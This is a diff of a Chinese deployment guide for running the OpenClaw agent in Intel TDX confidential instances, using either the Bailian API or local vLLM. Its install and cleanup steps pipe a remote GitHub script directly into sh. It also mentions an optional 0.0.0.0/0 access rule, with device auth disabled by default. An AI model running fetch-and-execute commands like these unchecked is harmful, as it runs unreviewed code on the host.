@@ -1,228 +1,219 @@
-# 基于 TDX 机密计算实例一键构建 OpenClaw 机密 AI Agent（接入百炼 API）
+# 一键构建 OpenClaw 机密 AI Agent（百炼 API 与本地 vLLM 双场景）
 
 ## 背景信息
 
-OpenClaw（[openclaw.ai](https://openclaw.ai)）是一款开源个人 AI Agent，支持插件式工具调用、Live Canvas 可视化工作区、多 IM 平台集成（钉钉、Discord、Slack）以及内置的 agent 驱动架构。AI Agent 在运行过程中处理用户对话、调用外部工具、管理长期记忆和服务凭证，攻击面远超传统应用：从单轮对话扩展到整个执行链路。本方案将 OpenClaw 封装在 Intel TDX（Trust Domain Extensions）可信执行环境中，通过硬件级内存加密、远程证明、供应链可验证和端到端加密访问，确保用户对话、Agent 状态和工具执行过程在受保护的边界内闭环流转。
+OpenClaw（[openclaw.ai](https://openclaw.ai)）是一款开源个人 AI Agent，支持插件式工具调用、Live Canvas 可视化工作区、IM 平台集成以及 Agent 驱动架构。AI Agent 在运行过程中会处理用户对话、调用外部工具、管理长期记忆和服务凭证，攻击面覆盖从模型请求到工具执行的完整链路。
 
-以下资产构成 Confidential Agent 的核心保护范围：
+Confidential Agent 将 OpenClaw 封装在 Intel TDX（Trust Domain Extensions）可信执行环境中，并结合远程证明、dm-verity、Rekor 透明日志、PEP 策略执行点和 RATS-TLS 加密访问，保护用户对话、Agent 状态、SKILL 文件、模型调用凭据和工具执行过程。
 
-*   **用户对话隐私**：用户输入、工具执行上下文和 AI 回复，可能包含个人身份、医疗、金融等敏感信息。
-*   **Agent 记忆与状态**：OpenClaw 的长期记忆、配置、SKILL 文件，随运行时间积累形成高价值目标。
-*   **服务凭证**：百炼 DashScope API Key、钉钉 OAuth 凭据、OpenClaw Gateway Token（OpenClaw 应用层访问 token，不是 `cai-gateway` 的客户端凭据），一旦泄露可导致服务被接管或调用配额被冒用。
+本文合并覆盖两种最佳实践：
 
-Confidential Agent 的安全架构围绕以下核心原则构建：
+| 场景 | one-click 入口 | 推理后端 | 推荐实例 | 数据边界 |
+| --- | --- | --- | --- | --- |
+| OpenClaw + 百炼 API | `one-click/install.sh` | 阿里云百炼 DashScope API | `ecs.g9i.xlarge` | Agent、记忆、凭据在 TDX 内；Prompt 和回复经 HTTPS 发送到百炼 API。 |
+| OpenClaw + vLLM | `one-click/install-openclaw-vllm.sh` | 实例内 vLLM + Qwen3.6-35B-A3B | `ecs.gn8v-tee.4xlarge` | Agent、模型权重、推理中间态和回复均在 GPU TEE/TDX 实例内处理。 |
 
-1.  **硬件级机密性**：Intel TDX 内存加密引擎（MEE）对 Guest OS 全部内存进行透明加密，确保数据在 CPU、内存总线层面始终处于密文态，云厂商物理访问或 Hypervisor 侧信道均无法获取明文。
-2.  **全链完整性**：从 UKI 引导映像度量（RTMR）、dm-verity rootfs 防篡改，到远程证明（Remote Attestation）验证实例运行于真实 TDX 硬件，构建自底向上的信任链，任何组件被替换均可被检测。
-3.  **最小权限执行**：通过 PEP（Policy Enforcement Point）策略执行点在隔离容器中运行 Agent 工具调用，基于黑名单策略拦截网络外联、容器操作和敏感路径访问，防止 Prompt 注入导致的权限提升。
-4.  **供应链可验证**：构建产物通过 SLSA provenance 签名，镜像参考值记录于 Rekor 透明日志，部署时通过 Rekor 验证，确保运行时镜像与构建时一致。
-5.  **零信任部署**：磁盘密钥、百炼 API Key、钉钉凭据等机密资源在 UKI 引导阶段通过远程证明挑战注入到实例中，密钥由您本地持有，云厂商不参与密钥管理。
-6.  **通信端到端加密**：客户端通过可信网关建立端到端 RATS-TLS 安全通道，通过远程证明验证实例身份后才传输数据，所有对话、工具调用和管理通信全程加密传输，中间节点无法窃听或篡改。
+> **重要**
+>
+> 百炼 API 场景部署简单、成本较低，适合轻量 Agent 和托管模型调用。vLLM 场景需要 GPU TEE 库存和更长启动时间，适合要求模型推理也不离开 TEE 边界的场景。
 
-### 架构概览
+### 安全架构
 
 ![架构概览](images/00-architecture-overview.png)
 
-_图1. OpenClaw 在 TDX 机密计算实例上接入百炼 API 的部署架构_
+Confidential Agent 的保护范围包括：
 
-本方案的模型推理由 **阿里云百炼（DashScope）API** 提供，AI Agent 本身在 Intel TDX 信任域内运行。用户输入与 Agent 上下文在 TDX 内存边界内组装，再经 OpenClaw 通过 HTTPS 调用百炼 API 完成模型推理；用户对话历史、Agent 长期记忆、SKILL 文件、服务凭据和钉钉机器人状态均不离开 TDX 信任域。这种"机密 Agent + 托管模型"的拆分让本方案可以在通用 TDX 实例（无需 GPU）上运行，部署门槛、成本和扩展性都显著优于在本地运行大模型的方案。
+| 保护对象 | 说明 |
+| --- | --- |
+| 用户对话隐私 | 用户输入、工具执行上下文和 AI 回复，可能包含个人身份、医疗、金融等敏感信息。 |
+| Agent 记忆与状态 | OpenClaw 的长期记忆、配置、SKILL 文件和运行状态。 |
+| 服务凭证 | DashScope API Key、钉钉 OAuth 凭据、OpenClaw Gateway Token、模型服务配置等。 |
+| vLLM 模型资产 | vLLM 场景中的模型权重、GPU 驱动运行状态和推理中间态。 |
 
-> **说明**：
->
-> 与 [《基于异构机密计算实例构建 OpenClaw 机密 AI Agent》](https://help.aliyun.com) 中的"单机 vLLM 推理"方案不同，本方案不在 TDX 实例内部署大模型推理服务，而是直接调用百炼 API。两种方案的对比如下：
->
-> | 维度 | 本方案（百炼 API） | 单机 vLLM 推理方案 |
-> | --- | --- | --- |
-> | 推理后端 | 阿里云百炼 DashScope API | 实例内 vLLM + 本地权重 |
-> | 实例规格 | `ecs.g9i.xlarge`（TDX，无 GPU） | `ecs.gn8v-tee.4xlarge`（TDX + GPU） |
-> | 数据流 | 推理请求经 HTTPS 离开 TEE 调用百炼 | 推理全过程不出 TEE |
-> | 适用场景 | 轻量、低运维、按量付费、需要最新模型 | 数据严格不出域、模型权重需要保密 |
->
-> 如需将模型推理也置于 TEE 边界内，请参考单机 vLLM 推理方案。
-
-> **重要**：
->
-> 本方案中，模型推理 prompt 与回复会以 HTTPS 形式发送到百炼 API。百炼 API 由阿里云提供，符合阿里云数据保护承诺，但 prompt 内容会离开 TDX 实例的硬件加密边界。如对推理过程也有"数据不出 TEE"的要求，请使用单机 vLLM 推理方案。
-
-### 部署使用流程
-
-![部署使用流程](images/02-deployment-flow.svg)
-
-1. 源码获取与依赖安装：部署机下载 Confidential Agent 源码，安装 Docker、Rust 等依赖；如果系统中没有 Shelter，则安装仓库 `hack/` 中内置的 Shelter RPM。`cosign` 和 `rekor-cli` 已内置在 `confidential-agent-tools` 镜像中，不需要在部署机单独安装。
-2. 制品构建与参考值公开：从源码构建 OpenClaw 可信镜像，提取 TDX/UKI 参考值并上传 Rekor 透明日志。
-3. 创建 TDX 机密实例：通过 Shelter 与 Terraform 创建 ECS 实例、VPC、交换机、安全组、OSS Bucket 和自定义镜像。
-4. 远程证明验证与机密资源注入：部署工具对实例执行远程证明，验证通过后注入 OpenClaw 配置、百炼 API Key、钉钉凭据和 OpenClaw Gateway Token。
-5. 建立可信访问通道：部署机启动 TNG（Trusted Network Gateway）Client，对云端 TDX 实例进行远程证明并建立 RATS-TLS 加密通道。
-6. 访问 OpenClaw：用户通过 Web、桌面客户端、TUI 或钉钉与 OpenClaw 对话，所有访问流量经 TNG 通道进入 TDX 实例。
-
-### 安全分层
-
-Confidential Agent 部署中的核心数据均在 TEE（Trusted Execution Environment，可信执行环境）边界内闭环流转，安全架构自底向上覆盖硬件、启动链、运行时、密钥和通信五个层级：
-
-![安全架构](images/01-security-architecture.svg)
+安全能力自底向上覆盖五层：
 
 | 保护层级 | 机制 |
 | --- | --- |
-| 硬件层 | Intel TDX 对 Guest 内存透明加密，云平台和宿主机无法读取明文。 |
-| 启动链 | UKI（Unified Kernel Image，统一内核镜像）和 dm-verity rootfs 防篡改；镜像度量值上传 Rekor 透明日志。 |
-| 运行时 | `cai-pep`（Policy Enforcement Point，策略执行点）对高危命令、敏感路径和网络访问执行策略拦截。 |
-| 密钥管理 | 磁盘密钥、OpenClaw 配置、钉钉凭据、百炼 API Key 等机密资源仅在远程证明通过后注入。 |
-| 通信链路 | RATS-TLS 在建立连接前完成远程证明验证，访问链路端到端加密。 |
+| 硬件层 | Intel TDX 对 Guest OS 内存透明加密；gn8v-tee 场景同时使用 NVIDIA GPU 机密计算能力。 |
+| 启动链 | UKI 统一内核镜像和 dm-verity rootfs 防篡改；镜像参考值上传 Rekor。 |
+| 运行时 | `cai-pep` 对高危命令、敏感路径和网络访问执行策略拦截。vLLM 场景强制启用 PEP。 |
+| 密钥管理 | 磁盘密钥、OpenClaw 配置和凭据仅在远程证明通过后注入。 |
+| 通信链路 | TNG RATS-TLS 在建立连接前完成远程证明验证，全程加密传输。 |
+
+### 部署流程
+
+![部署使用流程](images/02-deployment-flow.svg)
+
+一键脚本会在部署机上完成以下工作：
+
+1. 安装 Alibaba Cloud Linux 3 构建依赖、Docker、Rust、Node.js、OpenClaw CLI 和 Shelter。
+2. 构建 `confidential-agent`、`confidential-agentd`、`cai-gateway`，并在启用 PEP 时构建 `cai-pep`。
+3. 构建包含 `cosign`、`rekor-cli`、TNG 和远程证明客户端的 `confidential-agent-tools:latest`。
+4. 生成 OpenClaw 配置和 AppSpec，构建可信镜像并上传 Rekor 参考值。
+5. 创建 ECS、VPC、交换机、安全组、OSS Bucket、自定义镜像等云资源。
+6. 通过远程证明注入 OpenClaw 配置、Gateway Token、密钥和可选钉钉凭据。
+7. 启动本地 TNG connect 隧道，验证 Web 控制台可访问。
 
 ## 前提条件
 
-在开始部署之前，请确认满足以下条件：
+请准备一台全新的 Alibaba Cloud Linux 3 ECS 作为部署机。部署机只负责构建和部署，承载 OpenClaw 的 TDX/GPU TEE 实例会由一键脚本自动创建。
 
-*   已开通阿里云 ECS 服务，账号具备创建 TDX 机密计算实例、VPC、交换机、安全组、OSS Bucket、自定义镜像等资源的权限。
-*   已准备一台 Alibaba Cloud Linux 3 ECS 实例作为部署机，可用磁盘空间不低于 80 GB。
-*   已获取阿里云访问凭证。建议使用 RAM 用户最小权限、RAM 角色或 STS 临时凭证，避免长期存储主账号 AccessKey。
-*   已开通阿里云百炼服务并获取 DashScope API Key（参考 [百炼控制台](https://bailian.console.aliyun.com)）。
-*   如需使用钉钉集成，已创建钉钉企业内部应用并获取 `Client ID` 和 `Client Secret`。
-*   部署机可以访问公网，用于拉取源码、系统包、Node.js、npm 包、Rekor 透明日志和阿里云 OpenAPI。
+| 条件 | 百炼 API 场景 | vLLM 场景 |
+| --- | --- | --- |
+| 部署机系统 | Alibaba Cloud Linux 3 | Alibaba Cloud Linux 3 |
+| 部署机磁盘 | 不低于 80 GB | 建议不低于 200 GB |
+| 目标实例 | `ecs.g9i.xlarge`，默认 `cn-beijing-i` | `ecs.gn8v-tee.4xlarge`，默认 `cn-beijing-l` |
+| 目标系统盘 | 默认 200 GB | 默认 512 GB |
+| 阿里云权限 | ECS、VPC、安全组、OSS、自定义镜像、镜像导入角色 | 同左，并需要 GPU TEE 实例库存和购买权限 |
+| 模型凭据 | DashScope API Key | 不需要 DashScope API Key |
+| 可选集成 | 钉钉企业内部应用凭据 | 钉钉企业内部应用凭据 |
 
-> **重要**：
+> **说明**
 >
-> 部署机仅用于执行构建和部署操作，后续一键脚本会自动创建新的 TDX 机密实例承载 OpenClaw 服务。部署机本身无需是 TDX 实例。本文以 `ecs.g9i.xlarge`、地域 `cn-beijing`、可用区 `cn-beijing-i` 为默认示例。
+> 如果 `ecs.gn8v-tee.4xlarge` 暂时无库存，请等待库存恢复或尝试同规格族其他 GPU TEE 可用区。
 
 ## 操作步骤
 
-以下步骤展示 one-click OpenClaw + 百炼主路径。如果你需要逐条执行 CLI 命令来审查或接入自己的自动化流水线，请参考 [OpenClaw CLI 分步部署示例](../openclaw-cli-step-by-step.md)。
+### 步骤一：准备部署机凭证
 
-本主路径覆盖两个部署分支：默认启用 PEP，用于验证 `cai-pep` 运行时拦截；显式传入 `--disable-pep` 时走 no-PEP 分支，用于验证 OpenClaw/Bailian、TNG connect、远程证明资源注入和 OpenClaw Gateway Token 的基础闭环。
+登录部署机后，设置阿里云访问凭证：
 
-### 步骤一：准备部署机
+```bash
+export ALICLOUD_ACCESS_KEY="<YOUR_ACCESS_KEY>"
+export ALICLOUD_SECRET_KEY="<YOUR_SECRET_KEY>"
+```
 
-1.  登录 ECS 实例。
+部署百炼 API 场景时，还需要设置 DashScope API Key：
 
-    访问 ECS 控制台，在页面左侧顶部选择目标地域和资源组，进入部署机实例详情页，单击远程连接，选择通过 Workbench 或 SSH 方式登录。
+```bash
+export DASHSCOPE_API_KEY="<YOUR_DASHSCOPE_API_KEY>"
+```
 
-2.  设置凭证环境变量。
+如需启用钉钉接入，继续设置：
 
-    执行以下命令导出阿里云访问凭证和百炼 API Key：
+```bash
+export DINGTALK_BOT_CLIENT_ID="<YOUR_DINGTALK_CLIENT_ID>"
+export DINGTALK_BOT_CLIENT_SECRET="<YOUR_DINGTALK_CLIENT_SECRET>"
+```
 
-    ```bash
-    export ALICLOUD_ACCESS_KEY="<YOUR_ACCESS_KEY>"
-    export ALICLOUD_SECRET_KEY="<YOUR_SECRET_KEY>"
-    export DASHSCOPE_API_KEY="<YOUR_DASHSCOPE_API_KEY>"
-    ```
+这些凭证仅在当前 shell 生效。一键脚本不会把阿里云凭证或 DashScope API Key 写入源码仓库；OpenClaw 配置和 Token 会在远程证明通过后注入到机密实例内。
 
-    如需启用钉钉接入，继续执行以下命令：
+### 步骤二：部署 OpenClaw + 百炼 API
 
-    ```bash
-    export DINGTALK_BOT_CLIENT_ID="<YOUR_DINGTALK_CLIENT_ID>"
-    export DINGTALK_BOT_CLIENT_SECRET="<YOUR_DINGTALK_CLIENT_SECRET>"
-    ```
-
-> **说明**：
->
-> 凭证仅在当前 shell 生效。退出 shell 或重启实例后需要重新 `export`。一键脚本不会把凭证写入磁盘，仅在远程证明通过后注入到 TDX 实例内。
-
-### 步骤二：执行一键部署
-
-在部署机上执行以下命令进入交互式部署：
+交互式部署：
 
 ```bash
 curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-agent/one-click/one-click/install.sh | sh
 ```
 
-脚本默认进入交互模式，会自动询问缺失的阿里云凭证、百炼 API Key、钉钉凭据、OpenClaw Gateway Token 和 operator CIDR。常用默认配置如下：
-
-| 配置项 | 默认值 | 说明 |
-| --- | --- | --- |
-| Region | `cn-beijing` | 阿里云地域。 |
-| Zone | `cn-beijing-i` | 支持 TDX 实例规格的可用区。 |
-| Instance Type | `ecs.g9i.xlarge` | 默认 TDX 实例规格。 |
-| System Disk | `200G` | OpenClaw 镜像和运行态所需磁盘空间。 |
-| OpenClaw Version | `2026.5.7` | OpenClaw 版本。 |
-| Node.js Version | `22.19.0` | OpenClaw 运行时 Node.js 版本。 |
-| npm Registry | `https://registry.npmmirror.com/` | OpenClaw 镜像构建时使用的 npm 源。 |
-| Reference Value | `rekor` | 构建后将参考值上传 Rekor，并在部署时使用 Rekor 验证。 |
-| State Dir | `$HOME/.confidential-agent` | 本地状态、密钥、Terraform 和构建产物目录。 |
-| PEP | enabled | 默认安装并启用 `cai-pep`。传入 `--disable-pep` 时不打包 PEP 二进制、OpenClaw PEP 插件、默认策略和 TDX attestation skill。 |
-
-OpenClaw Gateway Token 会写入 OpenClaw 配置的 `gateway.auth.token`，用于 Web、桌面客户端、TUI 和 WebSocket/API 访问鉴权。它不是 Confidential Agent `cai-gateway` 的 token，也不是 `cai-gateway` client 配置。
-
 非交互部署示例：
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-agent/one-click/one-click/install.sh | sh -s -- deploy-openclaw \
+curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-agent/one-click/one-click/install.sh | sh -s -- \
   --non-interactive \
   --yes \
   --region cn-beijing \
   --zone-id cn-beijing-i \
   --instance-type ecs.g9i.xlarge \
   --disk-gb 200 \
-  --enable-dingtalk
+  --bailian-model qwen3.7-max
 ```
 
-one-click OpenClaw + Bailian 主路径默认启用 PEP，并把 OpenClaw 的高风险工具执行接到 `cai-pep`。如果只想验证 OpenClaw/Bailian、TNG connect、远程证明资源注入和 OpenClaw Gateway Token 这条基础链路，而暂时不安装 PEP，可以显式传入：
+百炼 API 场景默认启用 PEP。如只验证 OpenClaw、百炼、远程证明资源注入、TNG connect 和 Gateway Token 基础链路，可显式禁用 PEP：
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-agent/one-click/one-click/install.sh | sh -s -- deploy-openclaw \
+curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-agent/one-click/one-click/install.sh | sh -s -- \
   --non-interactive \
   --yes \
   --disable-pep
 ```
 
-如需仅安装本机依赖、构建 Confidential Agent 组件和 tools 镜像，不创建云资源，执行以下命令：
+### 步骤三：部署 OpenClaw + vLLM
+
+vLLM 场景在 GPU TEE 实例内启动本地 vLLM OpenAI-compatible API，OpenClaw 通过 `local-vllm` provider 调用 `http://127.0.0.1:8090/v1`。
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-agent/one-click/one-click/install.sh | sh -s -- install-only
+curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-agent/one-click/one-click/install-openclaw-vllm.sh | sh -s -- \
+  --non-interactive \
+  --yes \
+  --region cn-beijing \
+  --zone-id cn-beijing-l \
+  --instance-type ecs.gn8v-tee.4xlarge \
+  --disk-gb 512
 ```
 
-### 步骤三：确认安全组 CIDR
+vLLM 默认配置如下：
 
-一键脚本会自动探测部署机公网出口 IP，并在交互模式下询问 operator access CIDR：
+| 配置项 | 默认值 |
+| --- | --- |
+| ModelScope 模型 | `Qwen/Qwen3.6-35B-A3B` |
+| 模型目录 | `/opt/models/Qwen3.6-35B-A3B` |
+| served model name | `Qwen3.6-35B-A3B` |
+| vLLM 版本 | `0.19.1` |
+| vLLM 端口 | `8090` |
+| 镜像变体 | 默认构建并部署 `release` 变体 |
 
-| 选项 | 含义 | 适用场景 |
-| --- | --- | --- |
-| 当前部署机公网 IP `/32` | 仅允许当前部署机访问控制面、状态接口、debug SSH 和 connect 端口。 | 默认推荐，适用于生产和测试。 |
-| 自定义 CIDR 列表 | 手动输入一个或多个 IPv4 CIDR，支持逗号或空格分隔。 | 浏览器出口、跳板机出口、企业 NAT 出口等需要同时放通的场景。 |
-| `0.0.0.0/0` | 允许所有 IPv4 来源访问 operator 暴露端口。 | 临时演示或受控网络环境。 |
-
-> **说明**：
->
-> 当前一键脚本仅支持 IPv4 CIDR；底层 `peering` 命令也只接受 IPv4 地址。部署机如果只有 IPv6 出口，请手动指定一个可用的 IPv4 CIDR。非交互传入的 `--allowed-cidr` 表示用户或运维入口 CIDR，支持逗号分隔、加引号的空格分隔，也可以重复传入；脚本仍会额外探测部署机公网出口 IP，并写入单独的 `deployer` peering，保证部署阶段的资源注入、状态检查和 connect 流程可达。
-
-> **重要**：
->
-> `0.0.0.0/0` 会扩大暴露面。默认 OpenClaw 配置禁用 device auth，控制面仅靠 OpenClaw Gateway Token 鉴权；与 `0.0.0.0/0` 叠加使用时，请将 Token 视为高敏感凭据妥善保管。生产环境请限制为具体公网出口 IP 或企业出口 CIDR。
-
-非交互指定 CIDR 示例：
+如需覆盖模型或端口，传入：
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-agent/one-click/one-click/install.sh | sh -s -- deploy-openclaw \
+curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-agent/one-click/one-click/install-openclaw-vllm.sh | sh -s -- \
+  --non-interactive \
+  --yes \
+  --vllm-model-id Qwen/Qwen3.6-35B-A3B \
+  --vllm-model-dir /opt/models/Qwen3.6-35B-A3B \
+  --vllm-served-model-name Qwen3.6-35B-A3B \
+  --vllm-port 8090 \
+  --vllm-version 0.19.1
+```
+
+> **重要**
+>
+> vLLM 场景强制启用 `cai-pep`，并安装 `tdx-remote-attestation` skill 到 `/home/openclaw/.openclaw/skills/tdx-remote-attestation/SKILL.md`。该 skill 依赖 `cai-pep attest collect-and-verify` 在 guest 本机执行远程证明，不支持 `--disable-pep`。
+
+排障时，可显式构建 `debug` 变体以启用 debug SSH：
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-agent/one-click/one-click/install-openclaw-vllm.sh | sh -s -- \
+  --non-interactive \
+  --yes \
+  --vllm-build-variants debug
+```
+
+该开关仅影响本次构建选择；正式默认值仍为 `release`。如需同时保留 release 产物并部署 debug 变体，可传入 `--vllm-build-variants release,debug`。
+
+### 步骤四：确认 operator CIDR
+
+脚本会探测部署机公网出口 IP，并把 operator 入口限制到该 IP `/32`。非交互模式下可通过 `--allowed-cidr` 指定一个或多个 CIDR：
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-agent/one-click/one-click/install.sh | sh -s -- \
   --non-interactive \
   --yes \
   --allowed-cidr 203.0.113.10/32,198.51.100.0/24
 ```
 
-### 步骤四：等待部署完成
+`--allowed-cidr` 表示用户或运维入口 CIDR；脚本仍会额外探测部署机公网出口 IP，并写入单独的 `deployer` peering，保证部署阶段资源注入、状态检查和 connect 流程可达。
 
-脚本会自动完成以下动作：
+> **警告**
+>
+> `0.0.0.0/0` 会扩大暴露面。默认 OpenClaw 配置禁用 device auth，控制面主要由 OpenClaw Gateway Token 保护。生产环境请限制为具体公网出口 IP 或企业出口 CIDR。
 
-1.  安装 Alibaba Cloud Linux 3 主机依赖，使用系统源中的 `cargo`/`rust`、`python3.11` 和 Node.js，并写入 Aliyun Cargo sparse registry；默认不使用 rustup。
-2.  在缺少 Shelter 时安装内置 Shelter RPM，并校验 Shelter 和 Docker。
-3.  构建 `confidential-agent`、`confidential-agentd` 和 `cai-gateway`，默认同时构建 `cai-pep`，并将这些二进制安装到 `/usr/local/bin`。传入 `--disable-pep` 时跳过 `cai-pep` 构建、安装和镜像打包。
-4.  构建内置 `cosign`、`rekor-cli`、TNG 和远程证明客户端的 `confidential-agent-tools:latest`，并在部署机安装与镜像内匹配的 OpenClaw CLI。
-5.  构建 OpenClaw 可信镜像，启用 FDE、dm-verity 和 UKI。
-6.  将镜像参考值上传 Rekor 透明日志。
-7.  创建阿里云云资源并启动 TDX ECS。
-8.  远程证明通过后注入 OpenClaw 配置、百炼 API Key、钉钉凭据和 OpenClaw Gateway Token。启用钉钉时，镜像内会按 OpenClaw 上游实践安装并构建 `soimy/openclaw-channel-dingtalk`，再写入 `dingtalk` channel 配置。
-9.  启动本地 TNG connect 隧道并执行 Web 可达性检查。默认配置使用 OpenClaw Gateway Token 访问控制面，用户后续可按需使用 TUI、chat 和 TDX skill；E2E 会覆盖 token 鉴权、chat 请求和 TDX skill 调用。
+### 步骤五：等待部署完成
 
-部署成功后，脚本会输出类似以下信息：
+部署成功后，脚本会输出类似信息：
 
 ```text
 Confidential Agent one-click summary
   state_dir: /root/.confidential-agent
   work_dir:  /root/.confidential-agent/one-click
-  service:   openclaw
+  spec:      /root/.confidential-agent/one-click/openclaw-vllm/openclaw-vllm.yaml
+  service:   openclaw-vllm
   region:    cn-beijing
-  zone_id:   cn-beijing-i
-  instance:  ecs.g9i.xlarge
-  cidrs:     203.0.113.10/32 198.51.100.0/24
-  dingtalk:  1
+  zone_id:   cn-beijing-l
+  instance:  ecs.gn8v-tee.4xlarge
+  cidrs:     203.0.113.10/32
+  deployer:  203.0.113.10/32
+  dingtalk:  0
   pep:       enabled
   token:     <generated-or-provided-token>
   web:       http://127.0.0.1:18789/openclaw
@@ -230,81 +221,91 @@ Confidential Agent one-click summary
   tui:       openclaw tui --url ws://127.0.0.1:18789 --token "<generated-or-provided-token>"
 ```
 
-> **说明**：
->
-> OpenClaw Gateway Token 会保存在 `$HOME/.confidential-agent/one-click/secrets/gateway.token`，后续重跑会复用同一个 Token。如需轮换，请删除该文件后重跑脚本。该 Token 只用于 OpenClaw 应用层访问鉴权，不是 Confidential Agent `cai-gateway` 的 token。
+OpenClaw Gateway Token 保存在 `$HOME/.confidential-agent/one-click/secrets/gateway.token`。后续重跑会复用同一个 Token；如需轮换，删除该文件后重跑脚本。该 Token 是 OpenClaw 应用层访问 Token，不是 `cai-gateway` 的客户端凭据。
 
-### 步骤五：访问受机密计算保护的 OpenClaw 服务
-
-服务就绪后，可以通过钉钉、Web、桌面客户端或 TUI 四种方式访问 OpenClaw。所有访问流量都经过 TNG RATS-TLS 通道进入 TDX 实例。
+### 步骤六：访问 OpenClaw
 
 ![接入方式](images/03-access-methods.svg)
 
-#### 方式一：通过钉钉聊天
+#### Web 控制台
 
-在钉钉中找到已配置的机器人，直接发送消息即可与 OpenClaw 对话。钉钉请求会进入云端 OpenClaw，OpenClaw 的配置、凭据和运行状态均在 TDX 实例内处理。
-
-| 检查项 | 说明 |
-| --- | --- |
-| 钉钉应用凭据 | `DINGTALK_BOT_CLIENT_ID` 和 `DINGTALK_BOT_CLIENT_SECRET` 已在部署时注入。 |
-| OpenClaw 配置 | 一键脚本会安装 `soimy/openclaw-channel-dingtalk` 插件，并在 guest 内生成包含 `dingtalk` channel 的 OpenClaw 配置。 |
-| 网络访问 | 钉钉平台需能访问 OpenClaw 侧配置的回调或连接方式，具体以 OpenClaw 与钉钉应用配置为准。 |
-
-#### 方式二：通过浏览器 Web 界面
-
-如果浏览器运行在部署机上，直接访问以下地址：
+如果浏览器运行在部署机上，直接访问：
 
 ```text
 http://127.0.0.1:18789/openclaw
 ```
 
-如果浏览器运行在个人电脑上，先在个人电脑上执行以下命令，从个人电脑到部署机建立 SSH 端口转发：
+如果浏览器运行在个人电脑上，先建立 SSH 端口转发：
 
 ```bash
 ssh -L 18789:127.0.0.1:18789 root@<DEPLOY_MACHINE_PUBLIC_IP>
 ```
 
-然后在个人电脑浏览器中访问以下地址：
+然后访问 `http://127.0.0.1:18789/openclaw`，输入步骤五输出的 Gateway Token。
 
-```text
-http://127.0.0.1:18789/openclaw
-```
+#### OpenClaw 桌面客户端
 
-页面打开后，填入步骤四输出的 OpenClaw Gateway Token 即可使用。
-
-#### 方式三：通过 OpenClaw 桌面客户端
-
-在个人电脑上安装 OpenClaw 桌面客户端，配置 Remote 模式：
+配置 Remote 模式：
 
 | 配置项 | 值 |
 | --- | --- |
 | Server URL | `ws://127.0.0.1:18789` |
-| Token | 步骤四输出的 OpenClaw Gateway Token |
+| Token | 步骤五输出的 OpenClaw Gateway Token |
 
-如果桌面客户端不在部署机上运行，先在个人电脑上执行以下命令建立 SSH 端口转发：
-
-```bash
-ssh -L 18789:127.0.0.1:18789 root@<DEPLOY_MACHINE_PUBLIC_IP>
-```
-
-#### 方式四：通过 OpenClaw TUI
-
-一键脚本会在部署机上安装与云端镜像匹配的 OpenClaw CLI。执行以下命令运行 TUI：
+#### OpenClaw TUI
 
 ```bash
 openclaw tui --url ws://127.0.0.1:18789 --token <YOUR_GATEWAY_TOKEN>
 ```
 
-> **注意**：
->
-> 默认 one-click 配置禁用 device auth，TUI 使用 Gateway Token 连接即可。如果你手动启用了 device auth，首次通过 TUI 连接时如提示 `pairing required`，请先在浏览器中访问 `http://127.0.0.1:18789/openclaw`，在节点页面找到待授权设备并单击 Approve，再返回 TUI 使用。
+#### 钉钉聊天
 
-### 步骤六（可选）：释放资源
+部署时传入 `--enable-dingtalk`，并确保 `DINGTALK_BOT_CLIENT_ID` 和 `DINGTALK_BOT_CLIENT_SECRET` 已设置。钉钉请求进入 OpenClaw 后，配置、凭据和 Agent 状态均在机密实例内处理。
 
-不再需要服务时，在部署机上执行以下命令释放云资源：
+### 步骤七：查询当前安全状态
+
+启用 PEP 的场景会内置 `tdx-remote-attestation` skill。用户可在 Web、TUI 或钉钉中询问：
+
+```text
+我的数据安全吗？
+这个环境可信吗？
+请验证当前 TDX 运行环境。
+```
+
+skill 必须通过以下命令获取并验证远程证明：
+
+```bash
+cai-pep attest collect-and-verify \
+  --aa-url http://localhost:8006 \
+  --tee tdx \
+  --policy default \
+  --claims
+```
+
+返回内容应关注：
+
+| 验证项 | 说明 |
+| --- | --- |
+| `hardware` | `submods.cpu0["ear.trustworthiness-vector"].hardware <= 32` 视为硬件验证通过。 |
+| UKI/RTMR 度量 | 用于展示启动链度量；只有匹配 reference value 后才能说明与构建参考值一致。 |
+| GPU evidence | vLLM/GPU TEE 场景中，如 claims 包含 `nvidia_gpu.0` 且字段正常，才说明 GPU evidence 可被验证。 |
+| PEP 状态 | 如果 `cai-pep` 服务不可用，不能声称工具执行沙箱保护已生效。 |
+
+日志中的 WARN，例如 collateral 过期提示或 GPU evidence 为空提示，不应直接当作认证失败。认证结论以 JSON claims 中的硬件和 evidence 字段为准。
+
+### 步骤八：释放资源
+
+释放百炼 API 场景资源：
 
 ```bash
 curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-agent/one-click/one-click/install.sh | sh -s -- cleanup \
+  --state-dir "$HOME/.confidential-agent"
+```
+
+释放 vLLM 场景资源：
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-agent/one-click/one-click/install-openclaw-vllm.sh | sh -s -- cleanup \
   --state-dir "$HOME/.confidential-agent"
 ```
 
@@ -312,17 +313,19 @@ curl -fsSL https://raw.githubusercontent.com/inclavare-containers/confidential-a
 
 ```bash
 confidential-agent destroy openclaw
+confidential-agent destroy openclaw-vllm
 ```
 
-`cleanup` 模式会自动停止本地 connect 隧道并清理 `connect.pid`。如果通过本地二进制释放，且本地 connect 隧道仍在运行，执行以下命令手动停止：
+如需手动停止本地 connect 隧道：
 
 ```bash
-kill "$(cat "$HOME/.confidential-agent/one-click/connect.pid")"
+kill "$(cat "$HOME/.confidential-agent/one-click/connect.pid")"                  # openclaw
